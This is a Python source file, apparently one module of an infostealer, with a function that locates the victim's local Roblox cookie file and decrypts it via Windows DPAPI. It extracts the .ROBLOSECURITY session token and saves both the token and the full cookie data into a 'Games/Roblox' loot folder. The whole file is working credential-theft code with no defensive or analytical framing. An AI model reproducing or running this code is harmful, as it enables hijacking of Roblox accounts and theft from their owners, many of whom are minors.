import win32crypt
import base64
import os
import json


def extract_roblox_cookies(folder: str) -> None:
    roblox_path_cookies: str = os.path.join(os.getenv("LOCALAPPDATA"), "Roblox", "LocalStorage", "RobloxCookies.dat")
    if not os.path.exists(roblox_path_cookies):
        return None

    with open(roblox_path_cookies, "rb") as cookies_file:
        file_data = cookies_file.read().decode()

    if not file_data:
        return None
    
    c = json.loads(file_data)

    if c["CookiesData"]:
        decode_cookies: str =  base64.b64decode(c["CookiesData"])
        result = win32crypt.CryptUnprotectData(decode_cookies, None, None, None, 0)[1]
        
        roblox_folder: str = os.path.join(folder, "Games", "Roblox")
        os.makedirs(roblox_folder, exist_ok=True)
        
        data: dict[str, str] = {
            os.path.join(roblox_folder, "Roblox-Token.txt"): result.decode().split(".ROBLOSECURITY")[1].split(" ")[0].strip(),
            os.path.join(roblox_folder, "RobloxCookies.txt"): result.decode()
        }
        for key, value in data.items():
            with open(key, "w", encoding='utf-8', errors='ignore') as files:
                files.write(value)